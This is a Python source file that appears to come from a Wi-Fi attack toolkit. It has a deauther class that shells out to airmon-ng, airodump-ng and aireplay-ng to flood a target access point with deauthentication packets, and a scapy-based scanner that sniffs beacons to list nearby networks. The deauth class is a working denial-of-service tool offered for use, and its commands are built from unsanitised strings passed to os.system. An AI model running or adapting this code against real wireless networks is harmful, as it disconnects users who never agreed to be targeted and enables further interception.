#!/usr/bin/python3
# -*- coding: utf-8  -*-
from time import sleep
import time
import datetime
from datetime import datetime, date
import os
import re
import sys
from colorama import Fore, Back, Style
import terminaltables
from socket import *
import random
from scapy.all import *
from threading import Thread
import pandas
from gif_for_cli.execute import execute
from terminaltables import AsciiTable
print("Init Wifi Features file...ok")


class Wifi_deauther(object):
    """docstring for Wifi_deauther."""

    def __init__(self, interface, mactarget, packets=None):
        super(Wifi_deauther, self).__init__()
        print(interface)
        ##recon
        if len(interface) == 0:
            print("interface not set !")
        else:
            print("set interface", interface, "in monitor mode...")
            comm = "airmon-ng start "+interface
            os.system(comm)
            print("starting recon...")
            comm = "airodump-ng "+interface
            os.system(comm)
            if packets is None:
                print("Set packets amount to 999")
                # -D mean "disable AP detection"
                comm = "aireplay-ng -D -0 999 -a "+mactarget+" "+interface
                packets = "999"
                os.system(comm)
            else:
                comm = "aireplay-ng -D -0 "+packets+ " -a "+mactarget+" "+interface
                os.system(comm)
        comm = "airmon-ng stop " + interface
        os.system(comm)

class Wifi_scanner(object):
    """docstring for Wifi_scanner."""

    def __init__(self, interface):
        super(Wifi_scanner, self).__init__()
        # interface.arg = interface
        # initialize the networks dataframe that will contain all access points nearby
        networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
        # set the index BSSID (MAC address of the AP)
        networks.set_index("BSSID", inplace=True)

        def callback(packet):
            if packet.haslayer(Dot11Beacon):
                # extract the MAC address of the network
                bssid = packet[Dot11].addr2
                # get the name of it
                ssid = packet[Dot11Elt].info.decode()
                try:
                    dbm_signal = packet.dBm_AntSignal
                except:
                    dbm_signal = "N/A"
                # extract network stats
                stats = packet[Dot11Beacon].network_stats()
                # get the channel of the AP
                channel = stats.get("channel")
                # get the crypto
                crypto = stats.get("crypto")
                networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)


        def print_all():
            while True:
                os.system("clear")
                print(networks)
                time.sleep(0.5)


        def change_channel():
            ch = 1
            while True:
                os.system(f"iwconfig {interface} channel {ch}")
                # switch channel from 1 to 14 each 0.5s
                ch = ch % 14 + 1
                time.sleep(0.5)


    # interface name, check using iwconfig

        # start the thread that prints all the networks
        printer = Thread(target=print_all)
        printer.daemon = True
        printer.start()
        # start the channel changer
        channel_changer = Thread(target=change_channel)
        channel_changer.daemon = True
        channel_changer.start()
        # start sniffing
        sniff(prn=callback, iface=interface)
        raw= input()
